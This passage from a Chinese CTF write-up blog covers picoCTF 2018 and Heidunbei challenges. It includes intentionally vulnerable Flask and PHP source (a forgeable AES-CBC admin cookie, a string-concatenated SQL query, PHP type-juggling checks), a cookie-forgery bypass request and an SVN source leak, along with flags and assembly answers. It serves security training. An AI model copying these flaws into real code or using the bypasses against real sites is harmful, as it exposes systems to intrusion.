OK</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">content-type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 438</span><br><span class="line"><span class="attribute">etag</span>: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:12:57 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;header&gt;</span><br><span class="line">            &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">            &lt;div class="user"&gt;Real Business Employee&lt;/div&gt;</span><br><span class="line">            &lt;a href="/logout"&gt;Logout&lt;/a&gt;</span><br><span class="line">        &lt;/header&gt;</span><br><span class="line">        &lt;main&gt;</span><br><span class="line">            &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="【X】Secure-Logon"><a href="#【X】Secure-Logon" class="headerlink" title="【X】Secure Logon"></a>【X】Secure Logon</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'seed removed'</span></span><br><span class="line">flag_value = <span class="string">'flag removed'</span></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \</span><br><span class="line">                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-ord(s[len(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        message = <span class="string">"I'm sorry the admin password is super secure. You're not getting in that way."</span></span><br><span class="line">        category = <span class="string">'danger'</span></span><br><span class="line">        flash(message, category)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    resp = make_response(redirect(<span class="string">"/flag"</span>))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    cookie[<span class="string">'password'</span>] = request.form[<span class="string">'password'</span>]</span><br><span class="line">    cookie[<span class="string">'username'</span>] = request.form[<span class="string">'user'</span>]</span><br><span class="line">    cookie[<span class="string">'admin'</span>] = <span class="number">0</span></span><br><span class="line">    print(cookie)</span><br><span class="line">    cookie_data = json.dumps(cookie, sort_keys=<span class="keyword">True</span>)</span><br><span class="line">    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)</span><br><span class="line">    print(encrypted)</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, encrypted)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(<span class="string">"/"</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, <span class="string">''</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      encrypted = request.cookies[<span class="string">'cookie'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">      flash(<span class="string">"Error: Please log-in again."</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'main'</span>))</span><br><span class="line">  data = AESCipher(app.secret_key).decrypt(encrypted)</span><br><span class="line">  data = json.loads(data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">     check = data[<span class="string">'admin'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">     check = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> check == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">'flag.html'</span>, value=flag_value)</span><br><span class="line">  flash(<span class="string">"Success: You logged in! Not sure you'll be able to see the flag though."</span>, <span class="string">"success"</span>)</span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">'not-flag.html'</span>, cookie=data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        c = AESCipher('password').encrypt('message')</span></span><br><span class="line"><span class="string">        m = AESCipher('password').decrypt(c)</span></span><br><span class="line"><span class="string">    Tested under Python 3 and PyCrypto 2.6.1.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = md5(key.encode(<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> b64encode(iv + cipher.encrypt(raw))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></span><br><span class="line">        enc = b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt(enc[<span class="number">16</span>:])).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h2 id="【X】A-Simple-Question"><a href="#【X】A-Simple-Question" class="headerlink" title="【X】A Simple Question"></a>【X】A Simple Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h1><h2 id="assembly-0"><a href="#assembly-0" class="headerlink" title="assembly-0"></a>assembly-0</h2><p>What does asm0(0xd8,0x7a) return? 0x7a。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm0</span><br><span class="line"></span><br><span class="line">asm0:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">movebx,DWORD PTR [ebp+0xc]</span><br><span class="line">moveax,ebx</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-1"><a href="#assembly-1" class="headerlink" title="assembly-1"></a>assembly-1</h2><p>What does asm1(0xcd) return? 0xca。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm1</span><br><span class="line"></span><br><span class="line">asm1:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xde</span><br><span class="line">jg part_a</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x8</span><br><span class="line">jnepart_b</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_a:</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x4e</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_b:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xee</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_c:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">part_d:</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-2"><a href="#assembly-2" class="headerlink" title="assembly-2"></a>assembly-2</h2><p>What does asm2(0x7,0x28) return?   <code>hex(int((0xa1df-0x7)/float(0x76))+1+0x28)</code> =&gt; 0x188</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm2</span><br><span class="line"></span><br><span class="line">asm2:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">sub    esp,0x10</span><br><span class="line">mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">mov DWORD PTR [ebp-0x4],eax</span><br><span class="line">mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">movDWORD PTR [ebp-0x8],eax</span><br><span class="line">jmp    part_b</span><br><span class="line">part_a:</span><br><span class="line">add    DWORD PTR [ebp-0x4],0x1</span><br><span class="line">addDWORD PTR [ebp+0x8],0x76</span><br><span class="line">part_b:</span><br><span class="line">cmp    DWORD PTR [ebp+0x8],0xa1de</span><br><span class="line">jle    part_a</span><br><span class="line">mov    eax,DWORD PTR [ebp-0x4]</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-3"><a href="#assembly-3" class="headerlink" title="assembly-3"></a>assembly-3</h2><p>What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  0x478</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp+0x8=&gt;0xbda42100</span><br><span class="line">ebp+0xc=&gt;0xb98dd6a5</span><br><span class="line">ebp+0x10=&gt;0xecded223</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp,esp</span><br><span class="line">        mov     eax,0xbc;0xbc</span><br><span class="line">        xor     al,al;0x00</span><br><span class="line">        mov     ah,BYTE PTR [ebp+0x9];0x2100</span><br><span class="line">        sal     ax,0x10;0x0000</span><br><span class="line">        sub     al,BYTE PTR [ebp+0xc];0x005b</span><br><span class="line">        add     ah,BYTE PTR [ebp+0xd];0xd65b</span><br><span class="line">        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 <code>sub 0x00,0xa5</code> 的值是<code>0x100-0xa5=0x5b</code> 。 三是<code>WORD PTR [ebp+0x10]</code> 的值是<code>0xd223</code> 而非<code>0x23d2</code> 。</p><p><img src="1541310455800.png" alt="1541310455800"></p><p>可参考 <a href="https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md" target="_blank" rel="noopener">此处</a> 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">moveax,0x19</span><br><span class="line">xoral,al</span><br><span class="line">movah,BYTE [ebp+0xa]</span><br><span class="line">salax,0x10</span><br><span class="line">subal,BYTE [ebp+0xd]</span><br><span class="line">addah,BYTE [ebp+0xc]</span><br><span class="line">xorax,WORD [ebp+0x12]</span><br><span class="line">movesp, ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br><span class="line">##################</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern int asm3(int a, int b, int c);</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">printf(&quot;0x%x\n&quot;, asm3(0xb5e8e971,0xc6b58a95,0xe20737e9));</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">##################</span><br><span class="line">[andrei@jacky 15:27:00] ~/Documents/pico/3</span><br><span class="line">——&gt; nasm -f elf32 end_asm_rev.S -o asmfun.o</span><br><span class="line">[andrei@jacky 15:27:42] ~/Documents/pico/3</span><br><span class="line">——&gt; gcc sol.c asmfun.o -o sol -m32</span><br><span class="line">[andrei@jacky 15:27:59] ~/Documents/pico/3</span><br><span class="line">——&gt; ./sol</span><br></pre></td></tr></table></figure><h2 id="assembly-4"><a href="#assembly-4" class="headerlink" title="assembly-4"></a>assembly-4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/pico18<span class="comment"># nasm -f elf32 comp.nasm -o comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># gcc -m32 -o comp comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># ./comp</span></span><br><span class="line">picoCTF&#123;1_h0p3_y0u_c0mP1l3d_tH15_32429699163</span><br></pre></td></tr></table></figure><p><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}</code> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1539266772853.png&quot; alt=&quot;1539266772853&quot;&gt;&lt;/p&gt;
&lt;p&gt;题目：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://2018game.picoctf.com/problems&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>福建省黑盾杯解题报告</title>
    <link href="https://findneo.github.io/180920-heidunbei/"/>
    <id>https://findneo.github.io/180920-heidunbei/</id>
    <published>2018-09-20T06:07:27.000Z</published>
    <updated>2019-01-25T23:21:37.076Z</updated>
    
    <content type="html"><![CDATA[<p>2018/9/16  福师大黑盾杯</p><p><img src="1541605429359.png" alt="1541605429359"></p><h1 id="信息泄露-代码审计"><a href="#信息泄露-代码审计" class="headerlink" title="信息泄露+代码审计"></a>信息泄露+代码审计</h1><p>svn泄露源码：<a href="http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt" target="_blank" rel="noopener">http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">$hex = (int)$code;</span><br><span class="line"><span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>GET</code> 请求<code>code=55146</code> ，  请求头添加<code>Cookie: user=admin;</code> 。</p><p><code>flag{a737c5c5b759c3705c8100accf65b5e4}</code> </p><h1 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$a=<span class="number">0</span>; </span><br><span class="line">$b=<span class="number">0</span>; </span><br><span class="line">$c=<span class="number">0</span>; </span><br><span class="line">$d=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) <span class="comment">//$x1=0;=&gt;$a=1;</span></span><br><span class="line">&#123; </span><br><span class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </span><br><span class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> ($x1) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                $a=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </span><br><span class="line"><span class="comment">//$x2=json_encode(['x21'=&gt;'2018hello','x22'=&gt;[[],0]]) ;</span></span><br><span class="line"><span class="comment">//string(32) "&#123;"x21":"2018hello","x22":[[],0]&#125;"</span></span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123; </span><br><span class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </span><br><span class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </span><br><span class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </span><br><span class="line">        <span class="comment">//array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 </span></span><br><span class="line">        <span class="comment">//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</span></span><br><span class="line">        <span class="comment">//第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。</span></span><br><span class="line">        <span 